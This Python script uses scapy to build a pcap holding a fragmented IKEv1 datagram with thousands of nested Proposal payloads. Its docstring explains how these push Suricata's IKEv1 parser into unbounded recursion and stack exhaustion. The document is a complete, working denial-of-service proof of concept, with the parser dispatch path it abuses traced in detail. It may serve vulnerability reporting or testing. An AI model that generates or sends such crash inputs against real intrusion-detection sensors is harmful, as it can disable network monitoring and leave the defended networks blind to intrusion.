#!/usr/bin/env python3
"""
Generate a pcap that drives Suricata's IKEv1 application-layer parser into
unbounded recursion (stack exhaustion) via a deeply nested Proposal chain.

The datagram framing mirrors the real parser dispatch in rust/src/ike:

  ike.rs   handle_input(): parses the 28-byte ISAKMP header, and because
           maj_ver == 1 calls handle_ikev1() with the header's next_payload.
  ikev1.rs handle_ikev1(): when the encryption flag is clear it runs
           parse_ikev1_payload_list() over the remaining bytes and calls
           parse_payload(cur_payload_type = header.next_payload, ...) on the
           first generic payload's data.
  parser.rs parse_payload(Proposal) -> parse_proposal_payload() peels one
           Proposal container and recurses back into parse_payload() using the
           attacker-supplied next_payload byte, with no depth cap.

So we set the ISAKMP header next_payload = 2 (Proposal) and wrap the nested
Proposal chain in a single generic payload. Each nesting level is 12 bytes.

The nested-chain construction is taken verbatim from the Rust unit harness.
"""
import argparse
import struct

from scapy.all import Ether, IP, UDP, Raw, fragment, wrpcap

# ISAKMP generic payload / header type constants
NEXT_PROPOSAL = 0x02  # IsakmpPayloadType::Proposal


def build_proposal(inner: bytes) -> bytes:
    """One Proposal container level (12 bytes + inner), spi_size = 0.

    Layout (matches the working Rust PoC exactly):
      [00 00 00 00]  proposal header: proposal_number, proposal_type,
                     spi_size=0, number_transforms
      [02 00 00 04]  generic-payload-1: next_payload=2 (Proposal), reserved=0,
                     length=4 (no data) -- the forced Transform placeholder
      [00 00]        generic-payload-2: next_payload=0, reserved=0
      [LL LL]        generic-payload-2 length = 4 + len(inner) (u16 BE)
      inner
    """
    gp2_len = 4 + len(inner)
    return (
        b"\x00\x00\x00\x00"
        + b"\x02\x00\x00\x04"
        + b"\x00\x00"
        + struct.pack(">H", gp2_len)
        + inner
    )


def build_nested(levels: int) -> bytes:
    buf = b""
    for _ in range(levels):
        buf = build_proposal(buf)
    return buf


def build_isakmp_datagram(levels: int) -> bytes:
    """Full ISAKMP/IKEv1 payload: 28-byte header + one generic payload that
    wraps the nested Proposal chain."""
    chain = build_nested(levels)

    # Wrap the chain in a single generic payload whose type is selected by the
    # ISAKMP header's next_payload field (= Proposal). next_payload=0 here so
    # the payload list stops after this one entry.
    gp = b"\x00\x00" + struct.pack(">H", 4 + len(chain)) + chain

    init_spi = 0x1122334455667788
    resp_spi = 0x0000000000000000  # initial request: responder cookie is zero
    next_payload = NEXT_PROPOSAL
    vers = 0x10  # maj_ver=1, min_ver=0
    exch_type = 0x02  # Identity Protection (Main Mode); not validated for v1
    flags = 0x00  # encryption bit (0x01) MUST be clear so payloads are parsed
    msg_id = 0x00000000

    body = gp
    total_len = 28 + len(body)

    header = struct.pack(
        ">QQBBBBII",
        init_spi,
        resp_spi,
        next_payload,
        vers,
        exch_type,
        flags,
        msg_id,
        total_len,
    )
    return header + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--levels", type=int, default=5000,
                    help="Proposal nesting depth (default 5000 ~ 60 KB)")
    ap.add_argument("--out", default="input.pcap")
    ap.add_argument("--fragsize", type=int, default=1480,
                    help="IP fragment payload size, multiple of 8 (default 1480)")
    args = ap.parse_args()

    payload = build_isakmp_datagram(args.levels)
    print("ISAKMP/IKEv1 datagram: {} Proposal levels, {} UDP payload bytes"
          .format(args.levels, len(payload)))

    # Client -> server, UDP/500 (default IKE port). resp cookie is zero so the
    # probe flags the flow to-server.
    ip = IP(src="10.0.0.1", dst="10.0.0.2", id=0x4242) / \
        UDP(sport=12345, dport=500) / Raw(load=payload)

    frags = fragment(ip, fragsize=args.fragsize)
    pkts = [Ether() / f for f in frags]
    print("emitted {} IP fragment(s)".format(len(pkts)))
    wrpcap(args.out, pkts)
    print("wrote {}".format(args.out))


if __name__ == "__main__":
    main()
